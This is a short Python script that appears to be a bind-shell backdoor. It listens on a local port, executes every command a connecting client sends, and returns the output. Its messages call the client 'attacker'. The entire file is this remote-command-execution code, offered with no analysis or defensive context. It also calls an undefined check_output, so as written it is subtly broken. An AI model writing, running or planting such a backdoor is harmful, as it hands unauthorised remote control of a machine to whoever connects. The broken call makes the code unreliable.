#!/usr/bin/python

import socket, subprocess, time

host = '127.0.0.1'
port = 12345
addr = host, port

server = socket.socket()
server.bind(addr)
server.listen(5)

while True:
    print('[*] Listening for connection...')
    client, addr = server.accept()
    clientIP, clientPort = addr
    print('[*] Connection established from attacker')
    while True:
        cmd = client.recv(1024)
        if cmd:
            #cmdOutput, cmdErr = subprocess.Popen(cmd, shell=True,
            #  stdout=subprocess.PIPE,
            #  stderr=subprocess.PIPE).communicate()
            cmdOutput = check_output(cmd)
            client.sendall(cmdOutput)
            #client.sendall(cmdErr)
        else:
            print('[*] Disconnecting from attacker')
            client.close()
            break
